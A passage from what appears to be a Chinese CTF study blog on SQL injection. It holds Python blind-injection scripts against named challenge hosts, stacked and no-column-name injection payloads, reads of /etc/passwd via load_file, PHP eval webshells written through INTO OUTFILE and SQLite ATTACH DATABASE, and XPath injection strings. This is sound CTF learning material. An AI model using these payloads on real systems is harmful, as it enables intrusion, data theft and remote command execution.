class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://47.109.145.173/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def inj():</span><br><span class="line">    payload = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;</span><br><span class="line">    #payload=&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;)&quot;</span><br><span class="line">    #payload = &quot;(select group_concat(id,email_id) from emails)&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        found = False</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            response = requests.post(</span><br><span class="line">                url,</span><br><span class="line">                data=&#123;&quot;username&quot;: f&quot;a&#x27; or ord(mid(&#123;payload&#125;,&#123;i&#125;,1))&lt;&#123;mid&#125;#&quot;,</span><br><span class="line">                      &quot;password&quot;: &quot;1&quot;</span><br><span class="line">                      &#125;</span><br><span class="line">            )</span><br><span class="line">            t = response.text</span><br><span class="line">            print(response.text)</span><br><span class="line">            if &quot;successful!&quot; in t:</span><br><span class="line">                high = mid</span><br><span class="line">            else:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class="line">            break</span><br><span class="line">        result += chr(mid - 1)</span><br><span class="line">        print(result)</span><br><span class="line">        found = True</span><br><span class="line">    print(&quot;Found:&quot;, result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inj()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://51f73495-ef72-4e32-ac7f-b1cd587b70b1.node5.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,100):</span><br><span class="line">    min_value = 33</span><br><span class="line">    max_value = 130</span><br><span class="line">    mid = (min_value + max_value) // 2</span><br><span class="line">    while (min_value &lt; max_value):</span><br><span class="line">        py = payload.format(i,mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">   &quot;id&quot;: py&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;Nu1L&quot; in r.text:</span><br><span class="line">            min_value = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            max_value = mid</span><br><span class="line">        mid = (min_value + max_value) // 2</span><br><span class="line">    if (chr(mid) == &quot; &quot;):</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line">    time.sleep(0.5)</span><br></pre></td></tr></table></figure>



<h3 id="4，堆叠注入"><a href="#4，堆叠注入" class="headerlink" title="4，堆叠注入"></a>4，堆叠注入</h3><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户输入：</span><br><span class="line">1; DELETE FROM products</span><br><span class="line">服务器端生成的 sql 语句为：（因未对输入的参数进行过滤）</span><br><span class="line">Select * from products where productid=1;DELETE FROM products</span><br></pre></td></tr></table></figure>

<p>PDO默认开启堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$con = new PDO(&quot;mysql:host=localhost;port=3306;dbname=ctf&quot;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br></pre></td></tr></table></figure>

<p>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</span><br></pre></td></tr></table></figure>

<p>局限性</p>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。当然，通常在web页面，可能只返回一个结果。堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服务器在访问数据时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的**mysqli_query()**函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是：<br>1目标存在sql注入漏洞<br>2目标未对”;”号进行过滤<br>3目标中间层查询数据库信息时可同时执行多条sql语句</p>
<p><strong>利用</strong></p>
<p>利用DELIMITER关键字(delimiter)修改更改一条sql语句的结束符，来达到堆叠注入的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter a</span><br><span class="line">mysql&gt; select 1a</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>题目</p>
<p>登进去发现用户积分是0 尝试堆叠</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def update():</span><br><span class="line">    payload=&quot;&quot;</span><br><span class="line">    t=requests.post(url,data=&#123;</span><br><span class="line">      &quot;user_name&quot;:f&quot;a&#x27;;update biao_name set user_points=42432234 where user_id=1;#&quot;,</span><br><span class="line">      &quot;user_pwd&quot;:&quot;admin&quot;</span><br><span class="line">    &#125;).text</span><br></pre></td></tr></table></figure>

<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><strong>无列名注入</strong></h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入 - 知乎 (zhihu.com)</a></p>
<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 <a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=109954541&content_type=Article&match_order=1&q=CTF&zhida_source=entity">CTF</a> 题目中，information_schema 库被过滤，使用这种方法获取列名。</p>
<p>原数据库</p>
<img src="/.io//image-20250604183229784-1754809764536-16.png" alt="image-20250604183229784" style="zoom:33%;">

<p>其中，列名为 id、name、password，使用 union 查询：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure>

<img src="/.io//image-20250604183303060-1754809764536-8.png" alt="image-20250604183303060" style="zoom:33%;">

<p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from 表名)a;</span><br><span class="line">末尾的 a 可以是任意字符，用于命名。</span><br></pre></td></tr></table></figure>

<img src="/.io//image-20250604183337860-1754809764536-9.png" alt="image-20250604183337860" style="zoom:50%;">



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</span><br><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>

<img src="/.io//image-20250604183122159-1754809764536-10.png" alt="image-20250604183122159" style="zoom:50%;">





<p>例如：表名 ads 和 users，不知道列名，另外还过滤了反引号&#96;，空格 和 or 被过滤，用别名aaa来代替</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#x27;/**/union/**/select/**/1,(select/**/aaa/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250604184019442-1754809764536-11.png" alt="image-20250604184019442"></p>
<p>第二列内容为 flag，那么看看第三列。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#x27;/**/union/**/select/**/1,(select/**/bbb/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250604184035136-1754809764536-12.png" alt="image-20250604184035136"></p>
<p>得到flag</p>
<p>原形式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,(select group_concat(c) from (select 1,2,3 as c union select * from users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="ascii位偏移："><a href="#ascii位偏移：" class="headerlink" title="ascii位偏移："></a><strong>ascii位偏移：</strong></h3><p>二分法盲注爆出来表名是f1ag_1s_h3r3_hhhhh，但是information.schema被过滤以后我们没法像之前一样继续爆列名。但我们知道了表名所以可以用ascii位偏移比较字符串来获取表的内容。<code>(select 1,&quot;&#123;&#125;&quot;)</code>是因为flag在f1ag_1s_h3r3_hhhhh的第二列，可以从<code>(select 1,1)</code>，<code>(select 1,1,1)</code>试出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://51f73495-ef72-4e32-ac7f-b1cd587b70b1.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="line">def add(flag):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    res += flag</span><br><span class="line">    return res</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    for char in range(32, 127):</span><br><span class="line">        hexchar = add(flag + chr(char))</span><br><span class="line">        payload = &#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(hexchar)</span><br><span class="line">        #print(payload)</span><br><span class="line">        data = &#123;&#x27;id&#x27;:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            flag += chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">关于payload中的</span><br><span class="line"></span><br><span class="line">(select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br><span class="line">这里的字段数一定是一一匹配，这里f1ag_1s_h3r3_hhhhh是有两个字段的(可以用select 1|select 1,2|select 1,2,3试试就好)，知道是两个字段后，还要注意字段内的一一对应，f1ag_1s_h3r3_hhhhh表中的flag在第二个字段</span><br><span class="line">这样&quot;&#123;&#125;&quot;与flag就实现了对应(f1ag_1s_h3r3_hhhhh表的第一个字段可能是id啥的，跟咱们没有关系了)</span><br></pre></td></tr></table></figure>

<h3 id="SQL-通配符"><a href="#SQL-通配符" class="headerlink" title="SQL 通配符"></a><strong>SQL 通配符</strong></h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-wildcards.html">SQL 通配符 | 菜鸟教程 (runoob.com)</a></p>
<p>在 SQL 中，通配符与 SQL LIKE 操作符一起使用。<br>SQL 通配符用于搜索表中的数据。<br>在 SQL 中，可使用以下通配符：</p>
<img src="/.io//image-20250604200634225-1754809764536-13.png" alt="image-20250604200634225" style="zoom:50%;">

<h3 id="rename语句"><a href="#rename语句" class="headerlink" title="rename语句"></a><strong>rename语句</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename table 旧名 to 新名;</span><br></pre></td></tr></table></figure>

<p>这里不要给名字加引号！ 数字除外哈！</p>
<h3 id="UPDATE语句"><a href="#UPDATE语句" class="headerlink" title="UPDATE语句"></a><strong>UPDATE语句</strong></h3><p>update语句用于更新表中已存在的记录，可以用作已知数据库内容的题目需要买东西但是钱不够啊什么的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;</span><br><span class="line">(where及其后面的语句可以省略)</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">table_name：要修改的表名称。</span><br><span class="line">column1, column2, ...：要修改的字段名称，可以为多个字段。</span><br><span class="line">value1, value2, ...：要修改的值，可以为多个值。</span><br><span class="line">condition：修改条件，用于指定哪些数据要修改。</span><br></pre></td></tr></table></figure>

<h3 id="ALTER语句"><a href="#ALTER语句" class="headerlink" title="ALTER语句"></a><strong>ALTER语句</strong></h3><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/1431">文章列表 | NSSCTF</a></p>
<p>修改字段名： alter table 表名 change 旧字段名 新字段名 类型;</p>
<p>如需在表中添加列，请使用下面的语法:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 新列名 类型</span><br></pre></td></tr></table></figure>

<p>题目：强网杯随便注：</p>
<p>使用<code>1&#39;</code> 发现报错说明是字符型单引号</p>
<p>根据题目标签提示有堆叠注入<br>我们使用<code>1&#39;;show+tables;#</code>获取到所有的表</p>
<img src="/.io//image-20250604202012887-1754809764536-14.png" alt="image-20250604202012887" style="zoom:50%;">

<p>然后使用<code>show columns from 表名;</code>获取到表中的字段名</p>
<img src="/.io//image-20250604202034008-1754809764536-15.png" alt="image-20250604202034008" style="zoom:50%;">

<p><img src="/.io//image-20250604202043668-1754809764536-17.png" alt="image-20250604202043668"></p>
<p><img src="/.io//image-20250604202054512-1754809764536-18.png" alt="image-20250604202054512"></p>
<p>通过观察 words表单有两列, 也就是上面的 1 和 hahahah<br>我们可以推测 这个表单其实是从words表中以<code>id</code>字段为索引获取到内容 然后返回到前台<br>并且后台的查询语句为<code>&quot;select * from words where id=&#39;&quot;.$_GET[&#39;inject&#39;].&quot;&#39;&quot;</code></p>
<p>那么 我们是不是可以通过修改带flag字段的表的名字为words表 然后把flag 字段修改为id<br>通过三条alter语句来修改</p>
<ul>
<li>修改words表名为其他的<ul>
<li><code>alter table words rename words1;</code></li>
</ul>
</li>
<li>修改1919810931114514表名为words<ul>
<li>alter table <code>1919810931114514</code> rename words;</li>
</ul>
</li>
<li>修改新的words表中的flag列名为id<ul>
<li>alter table words change flag id varchar(60);<br>得到最终payload <code>1&#39;;alter table words rename words1;alter table </code>1919810931114514<code> rename words;alter table words change flag id varchar(60);#</code></li>
</ul>
</li>
</ul>
<p>提交payload</p>
<p><img src="/.io//image-20250604202949052-1754809764536-19.png" alt="image-20250604202949052"></p>
<p>发现没结果了, 原因是新的id列中的值已经变为flag值了 所以查询inject&#x3D;1查不到<br>我们可以通过让where条件永远为正查出来所有数据<br>构造payload<code>1&#39; or &#39;1&#39;=&#39;1</code><br>获取到flag值</p>
<h3 id="sql注入文件读写方式："><a href="#sql注入文件读写方式：" class="headerlink" title="sql注入文件读写方式："></a><strong>sql注入文件读写方式：</strong></h3><img src="/.io//image-20250604213430797-1754809764536-20.png" alt="image-20250604213430797" style="zoom:50%;">

<p><a target="_blank" rel="noopener" href="http://localhost/sql/less-7/?id=1">http://localhost/sql/less-7/?id=1</a>‘)) and 1&#x3D;1–+    显示原页面</p>
<p><a target="_blank" rel="noopener" href="http://localhost/sql/less-7/?id=1">http://localhost/sql/less-7/?id=1</a>‘)) and 1&#x3D;2–+    报错</p>
<p><img src="/.io//image-20250604213502904-1754809764536-21.png" alt="image-20250604213502904"></p>
<p>load_file() ：读取指定文件。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。</p>
<p>load data infile()：读取指定文件[当secure_file_priv为null时可以代替load_file()]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;/flag&quot;)</span><br><span class="line"></span><br><span class="line">values(load_file(&#x27;/etc/passwd&#x27;))</span><br></pre></td></tr></table></figure>

<p>into outfile ：将查询的数据写入文件中</p>
<p>into dumpfile：将查询的数据写入文件中 (只能写入一行数据)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,&#x27;一句话&#x27; into outfile &#x27;/var/www/html/1.php&#x27; --+</span><br><span class="line"></span><br><span class="line">values(0x3c3f706870206576616c28245f504f53545b315d293b3f3e) into outfile &#x27;/var/www/html/1.php&#x27;</span><br><span class="line">#&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>sqlmap: –file-write 要写入的文件 –file-dest 写入的绝对路径</strong></p>
<p>你必须指定文件的绝对路径，MySQL 将在服务器的文件系统中创建该文件。如果你只是使用 1.php，那么文件将默认保存到 MySQL 的数据目录中，或者会因权限问题导致无法创建文件。</p>
<p>如果没有可以写的地方可以在末尾加上xxx terminated by</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FIELDS TERMINATED BY &#x27;aaa&#x27; 用于指定字段之间的分隔符为aaa。</span><br><span class="line"></span><br><span class="line">LINES TERMINATED BY &#x27;aaa&#x27; 就表示每行数据 aaa 作为结束。</span><br></pre></td></tr></table></figure>



<p><strong>sqlite写webshell</strong></p>
<p>SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE file_name AS database_name;</span><br></pre></td></tr></table></figure>

<p>如果附加数据库不存在，就会创建该数据库，如果数据库文件设置在web目录下，就可以写入webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;/var/www/html/shell.php&#x27; AS shell;</span><br><span class="line">create TABLE shell.exp (webshell text); </span><br><span class="line">insert INTO shell.exp (webshell) VALUES (&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<p>示例代码使用的是 query() 函数来执行 SQL 语句，此时无法执行分号隔离的多条语句。可以将 query() 换成 exec()，可造成堆叠注入，就可以写 Webshell 了，exec()函数执行后没有回显。执行如下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create TABLE shell.exp (webshell text); </span><br><span class="line">insert INTO shell.exp (webshell) VALUES (&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;); /*</span><br></pre></td></tr></table></figure>

<p><strong>use outfile</strong>方法做</p>
<p>先确定单引号</p>
<p><img src="/.io//image-20250523204750570-1754809764536-22.png" alt="image-20250523204750570"></p>
<p>然后测试括号</p>
<p><img src="/.io//image-20250523204745055-1754809764538-93.png" alt="image-20250523204745055"></p>
<p>?id&#x3D;1’)) order by 1–+</p>
<p>然后布尔盲注可以</p>
<p>这里用outfile方式做</p>
<p>用outfile写入一句话木马，不过有两个前置条件：1.有写入权限 2.知道网站在服务器上的绝对路径</p>
<p>网站的绝对路可以去前面几题获取（在实战中的话就需要看前期的信息搜集有没有得到绝对路径了）,payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/Less-2/?id=-1 union select 1,@@basedir,@@datadir</span><br><span class="line">    basedir()指定了安装MYSQL的安装路径</span><br><span class="line">    datadir()指定了安装MYSQL的数据文件路径</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250523205056811-1754809764537-41.png" alt="image-20250523205056811"></p>
<p>这样便得到了绝对路径，直接写入一句话木马，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.237.1/sqli-labs/Less-7/?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php eval(@$_POST[&quot;admin&quot;]);?&gt;&#x27; into outfile&quot;F:\\phpstudy_pro\\WWW\\sqli-labs\\less-7\\hack.php&quot;--+</span><br><span class="line"></span><br><span class="line">注意写入的绝对路径要用双反斜杠，不然会写入不成功；</span><br></pre></td></tr></table></figure>

<p><strong>sql写shell</strong></p>
<p>mysql 启动时，加了选项 <code>--secure_file_priv=&#39;&#39;</code>，这个的选项作用是允许 mysql 进行文件读写。</p>
<ul>
<li>如果这个选项是 <code>NULL</code>，说明不能进行文件读写</li>
<li>如果这个选项是指定的目录，说明只能对指定目录进行文件读写</li>
<li>如果这个选项是空字符串，也就是 <code>&#39;&#39;</code>，能对任意目录进行文件读写</li>
</ul>
<p>程序运行时，执行了命令 <code>chmod 777 /var/www/html</code>，作用是允许该目录被所有用户写入文件。</p>
<p>所以思路就是通过注入 SQL 语句，进行写文件，写一个木马到网站根目录（<code>/var/www/html</code>）下即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.109.128:8889&#x27;</span><br><span class="line"></span><br><span class="line">payload = &#x27;\&#x27; || 1 union select 1,2,&quot;&lt;?php eval($_GET[1]);&quot; into outfile \&#x27;/var/www/html/3.php\&#x27;#&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.get(url,params=&#123;&#x27;student_name&#x27;: payload&#125;)</span><br><span class="line">res = requests.get(f&#x27;&#123;url&#125;/3.php&#x27;, params=&#123;&#x27;1&#x27;: &#x27;system(&quot;cat /you_cannot_read_the_flag_directly&quot;);&#x27;&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>





<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p><img src="/.io//image-20250604213618334-1754809764536-23.png" alt="image-20250604213618334"></p>
<p>需要python 2.7</p>
<h3 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h3><p>打开实例，点击USER QUREY，发现出现一个id&#x3D;1，猜测为sql注入，试了全部的sql注入方式都不成功，猜测应该不是sql注入了，后面找到一份大佬的wp，说这种可能是<strong>Xpath注入</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XPath语言是一种用于在XML文档中定位元素和属性的语言，可以进行类似于SQL注入的攻击，即XPath注入。XPath注入是指攻击者通过构造恶意的XPath查询语句，从而使应用对数据库进行不安全的查询，进而实现非法的数据查询和甚至篡改数据的攻击行为。</span><br><span class="line"></span><br><span class="line">攻击者可以通过构建XPath语句来绕过应用程序验证，从而获取权限和数据。攻击者可以借助注入攻击来突破身份验证、读取其他用户的数据或删除数据，甚至可以对整个系统造成破坏性影响。</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43296565/article/details/131066567#t16">https://blog.csdn.net/weixin_43296565/article/details/131066567#t16</a></p>
<p>万能访问xml文档所有节点的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;]|//*|//*[&#x27;                 //</span><br></pre></td></tr></table></figure>

<p><strong>Xpath查询语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&quot;user/username[@name=&#x27;&quot;.$user.&quot;&#x27;]&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>Xpath注入的用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、注入点：URL、表单或其它信息上附带恶意的 XPath 查询代码</span><br><span class="line">2、注入漏洞验证：输入id=1&#x27;、id=-1看页面是否返回报错信息</span><br><span class="line">3、注入万能公式：id=1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="line">4、万能访问xml文档所有节点的payload:&#x27;]|//*|//*[&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;]|//*|//*[&#x27;：我的理解是将查询语句闭合，从当前节点选择文档中的节点匹配所有元素的节点</span><br></pre></td></tr></table></figure>





<h3 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a><strong>xpath报错注入</strong></h3><h4 id="extractValue-报错注入"><a href="#extractValue-报错注入" class="headerlink" title="extractValue()报错注入"></a>extractValue()报错注入</h4><p>●此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<br>●extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）<br>●select user,password from users where user_id&#x3D;1 and (extractvalue(1,0x7e));<br>●由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p>
<p><img src="/.io//image-20250604213954334-1754809764536-24.png" alt="image-20250604213954334"></p>
<p><img src="/.io//image-20250604214003616-1754809764536-25.png" alt="image-20250604214003616"></p>
<p><strong>爆表名</strong></p>
